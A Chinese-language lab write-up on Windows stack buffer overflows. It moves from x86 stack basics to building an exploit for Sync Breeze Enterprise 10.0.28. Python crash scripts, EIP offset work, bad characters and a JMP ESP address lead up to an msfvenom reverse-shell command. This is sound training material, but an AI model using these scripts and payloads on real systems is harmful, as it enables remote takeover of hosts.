# 9-Windows Buffer Overflows

> 更详细的内容请查看 Penetration with Kali Linux 第10、11章

## x86架构简介

### 程序内存

当执行二进制应用程序时，它在现代计算机使用的内存边界内以非常特定的方式分配内存。下图显示了在Windows中进程内存是如何在应用程序使用的最低内存地址(0x00000000)和最高内存地址(0x7FFFFFFF)之间分配的:

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605316663808-c748a380-b51f-4954-a1a6-1ca4e7f659e7.png)

#### 堆栈

当线程运行时，它从程序映像中或从各种动态链接库(dll)中执行代码。线程需要一个存储函数、局部变量和程序控制信息的短期数据区域，这个区域被称为堆栈。为了方便多个线程的独立执行，运行中的应用程序中的每个线程都有自己的栈。

栈内存被CPU“视为”后进先出(LIFO)结构。这本质上意味着在访问堆栈时，放在堆栈顶部(“推入”)的项目首先被移除(“弹出”)。x86体系结构实现了专用的PUSH和POP组装指令，以便分别向堆栈添加或删除数据。

#### 函数返回

当线程中的代码调用函数时，它必须知道函数完成后返回哪个地址。这个“返回地址”(连同函数的参数和局部变量)被存储在堆栈上。这个数据集合与一个函数调用相关联，并存储在堆栈内存的一个部分中，称为堆栈帧。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605316793354-fa7fffa6-4caf-4389-a50e-b9c8b557acfb.png)

当函数结束时，返回地址从堆栈中取出，用于将执行流恢复到主程序或调用函数。

### CPU 寄存器

为了执行有效的代码执行，CPU维护和使用一系列的9个32位寄存器(在32位平台上)。寄存器是很小的、非常高速的CPU存储位置，可以在其中有效地读取或操作数据。这九个寄存器，包括这些寄存器的高位和低位的命名法，如下图所示。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605316866768-c92beaf9-9714-46bd-b24d-4e2da0099356.png)

寄存器名是为16位体系结构建立的，然后随着32位(x86)平台的出现而扩展，因此寄存器首字母缩写中有字母“E”。每个寄存器可以包含一个32位值(允许值在0到0xFFFFFFFF之间)，也可以在各自的子寄存器中包含16位或8位值，如下图中的EAX寄存器所示。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605316897300-9068074f-dee2-4f77-8556-588b2495146a.png)

#### 通用寄存器

几种寄存器，包括EAX、EBX、ECX、EDX、ESI和EDI，通常用作通用寄存器来存储临时数据。关于这个讨论还有更多的内容(在各种在线资源中有解释)，但是我们需要了解的主要寄存器如下所述:

- EAX(累加器):算术和逻辑指令
- EBX(基址):内存地址的基指针
- ECX(计数器):循环计数器，移位计数器，旋转计数器
- EDX(数据):I/O端口寻址，乘法和除法
- ESI(源索引):在字符串复制操作中，数据和源的指针寻址
- EDI(目标索引):在字符串复制操作中，数据和目标的指针寻址

#### ESP - 堆栈指针

如前所述，堆栈用于存储数据、指针和参数。由于堆栈是动态的，并且在程序执行过程中不断变化，ESP，即堆栈指针，通过存储一个指针来“跟踪”最近引用的堆栈位置(堆栈顶部)。

指针是对内存中地址(或位置)的引用。当我们说寄存器“存储指针”或“指向”地址时，这本质上意味着寄存器正在存储那个目标地址。

#### EBP - 基指针

由于堆栈在线程执行期间是不断变化的，因此函数很难定位自己的堆栈帧，堆栈帧存储了所需的参数、局部变量和返回地址。EBP，基指针，解决这个问题的方法是在函数被调用时存储一个指向堆栈顶部的指针。通过访问EBP，函数在执行时可以很容易地从它自己的堆栈帧(通过偏移量)引用信息。

#### EIP - 指令指针

指令指针EIP对于我们的目的来说是最重要的寄存器之一，因为它总是指向下一个要执行的代码指令。由于EIP本质上指导程序流，因此它是攻击者在利用任何内存破坏漏洞(如缓冲区溢出)时的主要目标。

## 缓冲区溢出演练

下面是一个简单的C程序，代码上是存在缓冲区溢出的风险的，但是我链接编译之后，在ollydbg里面看，多出了一个检查缓冲区溢出的函数。所以最后没有演示出成功的效果。

```
#include <stdio.h>
#include <string.h>

int main(int argc,char *argv[])
{
    char buffer[64];
    if(argc < 2)
    {
        printf("Error - You must supply at least one argument");
        return 1;
    }
    strcpy(buffer,argv[1]);
    return 0;
}
```

在这种情况下，main函数首先定义了一个名为buffer的字符数组，最多可以容纳64个字符。因为这个变量是在函数中定义的，C编译器将把它当作一个局部变量，并在堆栈上为它保留空间(64字节)。具体地说，当程序运行时，这个内存空间将在主函数堆栈框架中保留。

如果传递给主函数的参数是64个字符或更少，这个程序将像预期的那样工作并正常退出。然而，由于没有检查输入的大小，如果参数较长，比如80字节，堆栈中邻近目标缓冲区的部分将被剩余的16个字符覆盖，溢出数组边界。下图说明了这一点。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605322379496-3530074e-53f0-4208-881c-3d905adbb268.png)

### 调试

文中使用的是Immunity Debugger，下面我用吾爱破解的OllyDbg演示。

下面是第一次打开的界面，大致分为四块，首先我们先打开我们测试的程序，左上角文件 - 打开。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605322653898-444f21f5-47f4-42df-a4e6-9d2ad8c3f1f0.png)

因为这个程序需要在打开的时候传入参数，我们直接在下方的参数先输入12个A。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605322784696-8d8cbdca-0ded-43ee-8acc-4ad873b5bc6a.png)

加载之后就会如下图所示:

①区域显示了组成应用程序的汇编指令。高亮显示的指令(push ebp)是接下来要执行的汇编指令，它位于进程内存空间中的地址0x00401240。

②区域就是寄存器区域，用来显示当前各个寄存器里的值，可以看到EIP显示的是00401240，也代表着下条要执行的指令位于0x00401240。

③区域显示显示了任意给定地址的内存内容。与堆栈窗口类似，它显示三列，包括内存地址和十六进制和ASCII表示的数据。顾名思义，这个窗口在搜索或分析进程内存空间中的特定值时很有用，它可以通过右键单击窗口内容来访问上下文菜单，以不同格式显示数据。

④区域显示)显示了堆栈及其内容。这个视图包含四列:内存地址、驻留在该地址的十六进制数据、数据的ASCII表示，以及一个动态注释(在可用时提供与特定堆栈条目相关的附加信息)。数据本身(第二列)显示为32位值，称为DWORD，显示为4个十六进制字节。注意，这个窗格显示堆栈顶部的地址0x0018FF8，实际上，这是存储在寄存器窗口中的ESP中的值:

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605323733848-ebbf0f1c-61ec-409d-b4d6-6cd51fe5834d.png)

经过调试程序打开，我们的入口地址实际上是被改变的，我们需要自己定位到自己感兴趣的地方，程序中有一个提示字符串，我们右键汇编指令区域，选择查找 - 所有参考文本字串。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605323511256-83675212-8416-4e8a-8ec3-f8e71d65cfaf.png)

在出现的窗口，我们可以看到我们想要的字符串 “Error - You must supply at least one argument”：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605323871651-30d01b60-81b4-4118-8d41-295921e7646b.png)

双击这个字符串，会跳转到程序中汇编指令的所在地址，我们可以看到下面有一个很明显的strcpy字样的调用函数的指令，这个应该就是我们感兴趣的地方，单击这条指令，按F2下断点：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605323980250-835bc0ad-c760-448c-b076-50404ad2f0c3.png)

下了断点，指令的地址会变红，然后点击上方的播放按钮，就可以运行程序：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605324138699-4964bf26-56dd-43e2-bb1e-909635589410.png)

之后，程序会断在我们的断点部分，然后可以查看当前的堆栈状态，显示有一串字符串A在堆栈里：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605336910488-8a57d488-f6de-40ba-9e72-30d6d50597b5.png)

然后我说一些调试的快捷键，F2下断点，F7单步步入（一步一步执行，如果有函数会进入到函数里面），F8单步步出（一步一步执行，遇到函数，当做一个指令执行，不会进入函数内部），Ctrl + F9，执行到返回，就是运行到当前函数的返回指令。

我们需要进入这个strcpy的函数内部看一下，所以就按F7进入，我们可以看到左上角的汇编指令已经变了，然后右下角的堆栈区域压入了返回地址0x00401055，也就是上图中函数的下一条指令的地址：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605337433045-4fc48c41-e6d8-4bec-bd26-76a5efb4e332.png)

我们可以双击堆栈的第一列，这个地址的形式会变成相对的形式，可以更好的比对变化：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605337699508-4cf8eb5a-7922-41a4-ad3d-df83e993d1da.png)

这个时候，我们按一下Ctrl + F9，执行到当前函数的返回，然后看一下堆栈的变化，然后发现堆栈在往下滑会有一个区域有12个41，A转换为16进制的ASCII码就是41H：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605337909721-0b3e6ca9-0374-45fa-aca7-3b309d013358.png?x-oss-process=image%2Fresize%2Cw_1500)

往下滑，然后可以看到有一个返回地址，这一段应该是预分配的64个字节的堆栈区域：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605338218672-00c3479f-84b1-485d-a061-e3459df976c5.png)

我们可以通过写入过多的字符，然后将这个返回地址改为自己的想要的地址，甚至是去执行shellcode，我们重新打开文件，然后输入64+4+4个字符，最后这个应该就会覆盖返回地址：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605338572096-7359edd2-4869-4d67-9e93-ec2f7c61708f.png)

通过前面的相对位置也可以看出，也就是+9C这个位置的内容被覆盖了。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605338589358-e4bd8acf-5b97-4b53-9b1b-996e7622083a.png)

我们F7单步继续执行后，回到主函数，F8一步一步走到最后的retn，可以看到有一个push ebp，就把那个+98的内容放在了EBP里面，也就是我们也可以修改EBP：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605338815788-8a9be20b-44b4-4acd-adfe-1d29afbb1262.png)

之后我们F7继续执行，会发现左侧什么都没有了，然后右侧的寄存器变了，EIP编成了41414141，也就是下一条要执行的指令：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605339060693-26fd99f6-83a1-4fe8-99e0-4a0c936ae889.png)

以上就是一个简单的理解的实践，这个最后不见得能有什么效果出来，因为缓冲区溢出，涉及到返回地址的覆盖，然后还有一些“坏”字符，输入的话会产生截断等等，还有需要利用某个寄存器之类的，甚至还有需要查找某些装载到系统中是固定地址的模块的某个指令的地址，还要考虑到系统的一些保护机制，所以实际运用要学的还有很多。下面是一个实际的例子，也是原文中的，然后我进行了实践，大家也可以实践一下，软件的下载地址也在下面。

## 简单介绍一下DEP, ASLR和CFG

好几种保护机制已经被设计出来，以使EIP控制更难以获得或利用。微软实现了一些这样的保护，特别是数据执行阻止(DEP)，地址空间布局随机化(ASLR)， 和控制流保护(CFG)。在我们继续之前，让我们更详细地讨论一下这些。

DEP是一组硬件和软件技术，它们对内存执行附加检查，以帮助防止恶意代码在系统上运行。DEP的主要好处是，当试图执行数据页时，会引发一个异常，从而帮助防止代码执行。

每次操作系统启动时，ASLR都会随机化加载的应用程序和dll的基地址。在像Windows XP这样没有实现ASLR的老Windows操作系统上，所有dll每次都加载在相同的内存地址上，这使得开发更加简单。当与DEP结合使用时，ASLR对漏洞利用提供了非常强大的缓解作用。

最后，CFG，微软实现的控制流完整性，执行间接代码分支验证，防止函数指针的重写。

幸运的是，Sync Breeze软件在编译时没有DEP、ASLR或CFG支持，这使得开发过程简单得多，因为我们不必绕过这些内部安全机制，甚至不必担心这些机制。

## Sync Breeze Enterprise 10.0.28 缓冲区溢出

> 漏洞参考：https://www.exploit-db.com/exploits/42928
>
> 软件下载：https://www.exploit-db.com/apps/959f770895133edc4cf65a4a02d12da8-syncbreezeent_setup_v10.0.28.exe
>
> 文中的脚本代码最先开始使用的python3，但是后面发现了字符传输的问题，后面部分又改成了python2，但是转换问题不大，这里推荐你最先开始就使用python2，这样会避免一些错误问题的发生。

### HTTP模糊测试

目前Sync Breeze 的服务器是win7，然后在kali上面访问登陆界面。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605343748335-12bfbb19-21a9-4b70-94bf-5c54b032bf16.png)

然后呢，用wireshark或者burpsuite来分析http请求，我这里采用原文中的wireshark，其实burp用起来会更直观。发送一个登陆请求，追踪流查看内容：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605343862740-7dabf710-6ff3-43ae-8527-3fcc2899ea52.png)

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605343962940-caeaaf3e-f101-4985-80e3-de3a767773d6.png)

因为是针对缓冲区溢出，所以文中直接说了缓冲区溢出在用户名这里，然后写一个脚本来进行请求测试。

```
#! /usr/bin/python3
import socket

try:
    print("Sending evil buffer...")
    size = 100
    inputBuffer = "A"*size
    buffer = ""
    content = "username="+inputBuffer+"&password=A"
    buffer += "POST /login HTTP/1.1\r\n"
    buffer += "Host: 10.211.55.8\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Accept-Encoding: gzip, deflate\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Origin: http://10.211.55.8\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Referer: http://10.211.55.8/login\r\n"
    buffer += "Upgrade-Insecure-Requests: 1\r\n"
    buffer += "Content-Length: " + str(len(content)) + "\r\n"
    buffer += "\r\n"
    buffer += content

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.211.55.8",80))
    s.send(buffer.encode())                                                                                  
    s.close()                                                                                       
    print("Done!")                                                                                  
except Exception as e:                                                                              
    print(e)                                                                                        
    print("something wrong") 
```

上面测试成功之后，我们将这个size做一个循环，逐渐提高，然后到达一个度，之后就中断了发包：

```
#! /usr/bin/python3
import socket
import time
import sys

size = 100
while(size < 1000):
    try:
        print("Sending evil buffer...")
        inputBuffer = "A"*size
        buffer = ""
        content = "username="+inputBuffer+"&password=A"
        buffer += "POST /login HTTP/1.1\r\n"
        buffer += "Host: 10.211.55.8\r\n"
        buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
        buffer += "Accept-Encoding: gzip, deflate\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Origin: http://10.211.55.8\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Referer: http://10.211.55.8/login\r\n"
        buffer += "Upgrade-Insecure-Requests: 1\r\n"
        buffer += "Content-Length: " + str(len(content)) + "\r\n"
        buffer += "\r\n"
        buffer += content

        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("10.211.55.8",80))
        s.send(buffer.encode())
        s.close()
        print(size,"buffer done !")
        size += 100
        time.sleep(10)
    except Exception as e:
        print(e)
        print("something wrong")
        sys.exit()
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605350474739-8e246c9c-91dc-4b34-b433-24e2c88d9410.png)

应该是发生一些意外情况，我们在win7上面，对进程进行附加，我们用Immunity Debugger，跟OllyDbg操作一样，不过是英文的，我们先去找一下，哪一个进程在监听80端口，可以直接打开资源监视器，或者在任务管理器打开资源监视器，然后网络里面有个侦听端口，就可以看到 `syncbrs.exe` 在侦听80端口：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605350673449-ef772f96-b92a-495b-bf2a-a3cca3d050a3.png)

用Immunity Debugger附加它，因为它是以系统进程启动的，所以Immunity Debugger需要以管理员身份运行，要不然附加里面找不到这个进程：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605355622473-37f5b109-8dc4-4f0d-80e6-fc1621144df2.png)

附加之后会暂停进程，我们需要点一下播放按钮，继续运行就可以了，附加之后在运行一下脚本，我们会发现在800-900字节之间，会出现程序崩溃暂停了，EIP为41414141说明EIP被覆盖，试图执行这个地址的指令：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605356127717-7ecc9584-d739-490d-a4e3-b582980781db.png)

### 复现崩溃

然后我们开始复现崩溃，关掉调试工具，重新启动服务，在任务管理器 - 服务 -  服务 - Sync Breeze Enterprise，右键启动

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605356534810-49626256-57c2-42a9-849c-90c4a5d9dd8c.png)

然后再用调试工具附加一下，用下面修改过后的脚本再试一次：

```
#! /usr/bin/python3
import socket

try:
    print("Sending evil buffer...")
    size = 800
    inputBuffer = "A"*size
    buffer = ""
    content = "username="+inputBuffer+"&password=A"
    buffer += "POST /login HTTP/1.1\r\n"
    buffer += "Host: 10.211.55.8\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Accept-Encoding: gzip, deflate\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Origin: http://10.211.55.8\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Referer: http://10.211.55.8/login\r\n"
    buffer += "Upgrade-Insecure-Requests: 1\r\n"
    buffer += "Content-Length: " + str(len(content)) + "\r\n"
    buffer += "\r\n"
    buffer += content

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.211.55.8",80))
    s.send(buffer.encode())                                                                                  
    s.close()                                                                                       
    print("Done!")                                                                                  
except Exception as e:                                                                              
    print(e)                                                                                        
    print("something wrong") 
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605356863293-d993fa11-a3cb-4814-9f16-a20cfe8fdef6.png)

### 控制EIP

如上图所示，崩溃复现了，重复恢复服务，然后我们开始猜测这个EIP中覆盖之后的值是在我们字符中的什么地方，如果纯手工的话，可以通过二分法去猜测，比如现在是800个字符，我们用前400是A后400是B，然后如果EIP变成了B，那么说明在后半部分，然后再从后半部分分成200个B，200个C，就这样查下去，大概需要7次。文中介绍了 `msf-pattern_create` ，可以用 `-l` 指定长度，创建用于概念证明的字符串。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605358452280-792f4dca-92cf-404e-a0ab-6b2a29214c95.png)

我们将脚本中的 `inputBuffer` 变量的值改为生成的字符串，然后再复现一次崩溃：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605358665441-3f73bb86-1203-4578-8494-8503cb78ec1d.png)

通过上图，我们可以看到现在的EIP是 42306142，然后我们用 `msf-pattern_offset` 指令中的 `-q 42306142` 去查找它的具体位置，具体指令为：

```
msf-pattern_offset -l 800 -q 42306142
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605358911735-23b8a191-cff8-45f3-bcd3-a138a67f7566.png)

然后可以修改前780个字符为A，然后覆盖EIP的4个字符为B，然后剩下16个字符为C，然后重新验证一下：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605359346075-be9a5569-72b4-415f-8c2d-a58c8642e30a.png)

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605359377804-c079d75b-30ce-43c8-8484-01a5264482e7.png)

如上图所示，EIP已经变成了42424242。

### 定位存储shellcode所需的空间

现在，我们知道可以在EIP中放置任意地址，但是我们不知道要使用哪个实际地址。然而，我们不能选择一个地址，直到我们知道在哪里可以重定向执行流。因此，我们将首先关注我们希望目标执行的可执行代码，更重要的是，了解这些代码在内存中的位置。

理想情况下，我们希望目标执行我们选择的一些代码，比如一个反向shell。我们可以将这样的shellcode 作为触发崩溃的输入缓冲区的一部分。

Shellcode是一组程序集指令，在执行这些指令时，执行攻击者所需的操作。这通常是打开一个反向或绑定shell，但也可能包括更复杂的操作。

我们可以查看崩溃时的ESP为0x01847464，也就是堆栈的栈顶指针，然后右下角的堆栈显示中，可以看出是12个字节的空间，这显然是不够我们存放shellcode的（一般为350-400个字节），一个最直接的办法，就是增加溢出字符的空间，但是这个可能会导致我们的崩溃改改变，所以我们从800增加到1500，然后再看一下崩溃的结果。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605360899822-836a0b35-b397-44da-818a-2bfd8bccb0ea.png)

修改脚本的位置如下：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605361542292-add75e53-d8e7-4ffc-b5bd-d37a88217282.png)

运行之后，产生了崩溃，然后ESP的值变了，但是EIP值的相对位置没有变，如下图所示：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605361679946-6d71e26c-a131-4efc-b2da-ece3802de5b8.png)

现在堆栈中的内存空间已经基本足够了，0x02117728 - 0x02117464 = 0x2C4 = 708个字节：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605361735180-38dcf1ac-90be-43ac-ba2a-fc3c1a9329fe.png)

### 检查“坏”字符

根据应用程序、漏洞类型和正在使用的协议，可能有某些字符被认为是“坏的”，不应该在缓冲区、返回地址或shellcode中使用。常见的坏字符的一个例子是空字节0x00，特别是在未检查的字符串复制操作导致的缓冲区溢位中。这个字符被认为是不好的，因为在c/ c++等低级语言中，空字节也被用来终止字符串。这将导致字符串复制操作结束，有效地在null字节的第一个实例截断我们的缓冲区。

此外，由于我们发送攻击是作为HTTP POST请求的一部分，我们应该避免0x0D，返回字符，它表示HTTP字段的结束(在本例中是用户名)。

有经验的漏洞开发人员总是会检查坏字符。确定哪些字符对特定的利用不利的一种方法是发送所有可能的字符，从0x00到0xFF，作为缓冲区的一部分，并查看应用程序在崩溃后如何处理这些字符。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605363201167-e07f280b-b1f4-4fcf-9d77-46fb4e6345c9.png)

然后我们再尝试重启服务，运行脚本，运行之后发现并没有产生崩溃，但是产生了一个错误：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605363245978-adc014ea-8e99-477a-afc1-2d81e1e2f88f.png)

也就是说我们发送的请求包中Content-Length和实际的不相符，经过我的实践，我发现是python版本的问题，如果选用python3，socket的send方法会要求你发送的是一个byte类型的数组，所以需要调用字符串的encode()方法进行编码，然后就导致了这个发送字节长度和服务器判断实际长度的不符，用python2就不会有这个问题，相对应，socket的send方法直接发送字符串即可。我下面是测试的比较正常的字符，没有问题，但是0x80及以后的就都会有问题：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605365954922-3a7f562b-97ee-49f8-878e-ff82522af47d.png)

现在可以行得通了，第一次断在了09，没有0A，这个也在意料之中，因为它代表换行符：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605363686944-ad23fb63-1513-4759-84d6-f53b9aeaa805.png)

然后之后就是删除0A，继续进行测试，然后断在了0C，说明0D不可以：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605363971311-315705d3-3b8c-4168-8946-6faf7a74a0db.png)

后面就是一个重复的过程，最后的结果是0x00，0x0A，0x0D，0x25，0x26，0x2B，0x3D

### 重定向执行流

此时，我们已经控制了EIP寄存器，我们知道可以将shellcode放入一个内存空间，通过ESP寄存器可以轻松访问该内存空间。我们还知道哪些字符对于缓冲区是安全的，哪些字符是不安全的。我们的下一个任务是找到一种方法，将执行流重定向到位于崩溃时ESP寄存器所指向的内存地址的shellcode。

最直观的方法是尝试用崩溃时在ESP寄存器中弹出的地址替换覆盖EIP的‘B’。但是，正如我们前面提到的，ESP的值会随着崩溃而变化。栈地址经常变化，特别是在Sync Breeze这样的线程应用程序中，因为每个线程在操作系统分配的内存中都有其保留的堆栈区域。

因此，对特定堆栈地址进行硬编码并不是到达缓冲区的可靠方法。

### 寻找一个返回地址

> mona：https://github.com/corelan/mona
>
> 将mona.py放在Immunity Debugge目录下的PyCommands目录下

我们仍然可以将shell代码存储在ESP指向的地址中，但是我们需要一种一致的方式来执行代码。一种解决方案是利用JMP ESP指令，顾名思义，该指令在执行时“跳转”到ESP所指向的地址。如果我们能找到一个包含该指令的可靠的静态地址，我们可以将EIP重定向到这个地址，在崩溃时，JMP ESP指令将被执行。这种“间接跳转”将导致执行流进入我们的shellcode。

Windows中的许多支持库包含这一常用指令，但我们需要找到满足特定标准的引用。首先，库中使用的地址必须是静态的，这就消除了用ASLR支持编译的库。第二，指令的地址一定不能包含任何会破坏攻击的坏字符，因为地址将成为输入缓冲区的一部分。

我们可以用Immunity Debugger脚本mona.py，由Corelan团队开发的，用于开始我们的返回地址搜索。首先，我们将请求SyncBreeze使用 `!mona modules` 加载到进程内存空间中的所有dll(或模块)的信息，以产生下图的输出:

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605367597729-f46555b3-dc53-4130-9693-cfe2c307fcc4.png)

此输出中的列包括当前内存位置(基地址和顶地址)、模块大小、几个标志、模块版本、模块名称和路径。

从这个输出中的标志中，我们可以看到syncbr.exe可执行文件禁用了SafeSEH(结构化异常处理程序覆盖，一种利用预防性内存保护技术)、ASLR和NXCompat (DEP保护)。

换句话说，可执行文件没有使用任何内存保护方案进行编译，并且总是在相同的地址可靠地加载，这使得它非常适合我们的目的。

然而，它总是加载在基址0x00400000，这意味着所有指令的地址(0x004XXXXX)将包含空字符，这对我们的缓冲区不合适。

通过搜索输出，我们发现 libspp.dll 也适合我们的需求，并且地址范围似乎不包含坏字符。这正符合我们的需要。现在，我们需要在这个模块中找到一个自然发生的JMP ESP指令的地址。

> 高级提示:如果这个应用程序是用DEP支持编译的，那么我们的JMP ESP地址将必须位于模块的.text代码段中，因为这是唯一具有读(R)和可执行(E)权限的段。然而，由于DEP没有被启用，我们可以自由地使用来自该模块中任何地址的指令。

我们可以在调试器中使用本机命令来搜索JMP ESP指令，但是搜索必须在DLL中的多个数据区域上执行。相反，我们可以使用mona.py来彻底搜索汇编指令的二进制或十六进制表示(或操作码)。

要找到与JMP ESP等效的操作码，我们可以使用Metasploit NASM Shell ruby脚本，msf-nasm_shell，它产生的结果如图所示:

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605367947709-0bf53b23-69f0-4135-b1c4-c1e64a92d141.png)

我们可以用mona.py find搜索JMP ESP使用十六进制表示的操作码(0xFFE4)在LIBSSP.DLL的所有部分。

我们将使用-s和操作码十六进制字符串的转义值“\xff\xe4”指定搜索的内容。此外，我们使用-m选项提供所需模块的名称。

最后的命令 `!mona find -s "\xff\xe4" -m "libspp.dll"` ，如图所示:

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605368190068-be15969a-1857-475b-a3fa-bd2a3cd0c228.png)

最后找到的结果是0x10090c83，而且里面也没有“坏”的字符。

我们可以通过跳转到指定位置，查看指令，如图显示确实为JMP ESP：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605368370698-2d49c807-2444-40c5-a08c-cc69c1932e03.png)

在这里下一个断点，之后我们更改一下之前在定位shellcode存储空间代码中的eip的值，然后看一下是否会来到这里执行，这里因为有0x83，上面的脚本中的首行改为 `#! /usr/bin/python` ，然后send方法也不需要encode()了，代码如下，这里提示一下地址的问题，因为最先开始是放在堆栈里面的，然后结合它的特性，所以我们需要颠倒一下数值：

```
#! /usr/bin/python
import socket

try:
    print("Sending evil buffer...")
    pre = 'A'*780
    eip = "\x83\x0c\x09\x10"
    offset = 'C'*4
    last = 'D'*(1500 - len(pre) - len(eip) - len(offset))
    inputBuffer = pre + eip + offset + last
    buffer = ""
    content = "username="+inputBuffer+"&password=A"
    buffer += "POST /login HTTP/1.1\r\n"
    buffer += "Host: 10.211.55.8\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Accept-Encoding: gzip, deflate\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Origin: http://10.211.55.8\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Referer: http://10.211.55.8/login\r\n"
    buffer += "Upgrade-Insecure-Requests: 1\r\n"
    buffer += "Content-Length: " + str(len(content)) + "\r\n"
    buffer += "\r\n"
    buffer += content

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.211.55.8",80))
    s.send(buffer)                                                                                  
    s.close()                                                                                       
    print("Done!")                                                                                  
except Exception as e:                                                                              
    print(e)                                                                                        
    print("something wrong") 
```

执行之后发现，发现断在了指定位置：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605369745536-6b94ad95-312d-4c3f-9487-cd659f25221c.png)

### 用 Metasploit 生成 Shellcode

MSFvenom 是Msfpayload 和Msfencode的结合，把这两种工具都放到了一个框架实例中。它可以生成shellcode有效负载，并使用各种不同的编码器对它们进行编码。

目前，msfvenom命令可以自动生成超过500个shellcode有效载荷选项，如下面统计所示:

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605370559564-5e34f431-a361-4e3c-96fd-1e908c11132d.png)

msfvenom命令非常容易使用。我们将使用-p生成一个名为windows/shell_reverse_tcp的基本负载，它的作用很像一个Netcat反向shell。这个有效负载最低限度地需要一个LHOST参数，该参数定义shell的目标IP地址。还可以定义一个指定回接端口的可选LPORT参数，我们将使用format标志-f来选择c格式的shell代码。

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.211.55.4 LPORT=443 -f c
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605370766698-aee5e512-d9a3-474a-8c30-941aab4afbdd.png)

这看起来很简单，但是如果我们仔细观察，我们可以在生成的shellcode中识别坏字符(例如空字节)。

